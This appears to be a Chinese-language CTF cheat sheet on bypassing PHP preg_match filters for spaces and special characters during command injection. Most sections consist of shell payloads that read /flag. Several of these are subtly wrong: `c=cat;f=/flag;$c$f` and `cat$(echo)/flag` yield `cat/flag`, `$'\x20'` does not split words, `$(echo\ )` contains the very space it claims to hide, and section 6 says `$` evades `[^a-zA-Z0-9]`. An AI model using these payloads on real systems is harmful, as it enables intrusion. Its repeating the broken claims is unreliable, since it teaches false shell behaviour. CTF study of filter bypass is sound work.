## 1. 检测空格 (`preg_match("/ /", $input)`)

```shell
#使用 `$IFS`（内部字段分隔符），不直接输入空格：
#`IFS` 默认是空格，所以它会把 `$IFS` 看作是空格，但不会被检测到。也可以用其他值修改 `IFS`，比如制表符（tab）等。

cat$IFS/flag
```

------

## 2. 检测任意空白字符 (`preg_match("/[[:space:]]/", $input)`)

```shell
#使用十六进制表示空格（或其他空白字符）：
#`[[:space:]]` 匹配空白字符，不仅是空格，可能包括制表符、换行符等。所以你可以利用十六进制值绕过空格匹配，使用其他空白字符如 tab（`\x09`）和换行（`\x0a`）。
cat$'\x20'/flag   # 空格的十六进制表示
cat$'\x09'/flag   # Tab的十六进制表示
cat$'\x0a'/flag   # 换行符的十六进制表示
```

------

## 3. 检测普通空格和其他字符 (`preg_match("/ /", $input)` + 空格和其他字符)

```shell
#`$(echo)` 技巧，避免直接出现空格字符：
#`$(echo\ )` 会输出一个空格，但它并不会被 `preg_match("/ /", ...)` 直接匹配到，绕过了空格检测。
cat$(echo)/flag
cat$(echo\ )/flag
```

------

## 4. 检测以空格开头或结尾的命令（例如 `preg_match("/^ /", $input)`）

```shell
#命令拼接或扩展：
#避免了空格出现在开头或结尾，使用命令拼接的方式，规避了正则的直接匹配。
c=cat;f=/flag;$c$f
```

------

## 5. 检测空格作为分隔符（`preg_match("/ /", $input)` 与其他字符匹配）

```shell
#URL编码空格或替代符：
#URL编码会被自动解码，这对于 Web 环境是很有效的。如果空格被转义成 `%20`，它在通过后端系统时会被还原为真正的空格。可以尝试其他编码来规避检测。
cat%20/flag  # 空格的URL编码
cat%09/flag  # tab制表符的URL编码
cat%0a/flag  # 换行符的URL编码
```

------

## 6. 检测非法字符或限制字符（`preg_match("/[^a-zA-Z0-9]/", $input)`）

```shell
#使用可视字符，但不会被匹配：
#（`\x20` 是空格的十六进制表示）通过十六进制或转义字符来替代普通字符，不会被常见的字符范围限制（如 `a-zA-Z0-9`）匹配到。
cat$'\x20'/flag
```

------

## 7. 检测分隔符或者控制符（`preg_match("/[[:cntrl:]]/", $input)`）

```shell
#使用**控制字符**绕过：
#`[[:cntrl:]]` 匹配任何控制字符，类似于制表符、换行符、回车符等。通过利用可控制字符来绕过空格检测，完成命令注入。
cat$'\x1b'/flag   # Escape字符（\x1b）
cat$'\x0a'/flag   # 换行符（\x0a）
```

------

## 8. 综合绕过（结合多个技术）

- **绕过方法**：

```shell
#将多个技术结合使用：
#此方法结合了 `$(echo)`（输出空格）和 `$'\x20'`（空格的十六进制形式），适用于复杂的绕过场景，能充分避免正则的匹配。
cat$(echo\ )$'\x20'/flag
```

------

# 🚀 总结

> `preg_match("/ /", $input)` 通常用于检测空格，但只要你巧妙利用 Linux 中的各种技巧（比如 `$IFS`、`$(echo)`、十六进制表示等），就能绕过这类检测。
>
> 如果正则使用了更广泛的空白字符匹配（如 `[[:space:]]`），你可以尝试使用**控制字符**、**URL编码**或**十六进制表示**来绕过。
>
> 需要时，结合多个技巧一起用，能应对更复杂的过滤或检测。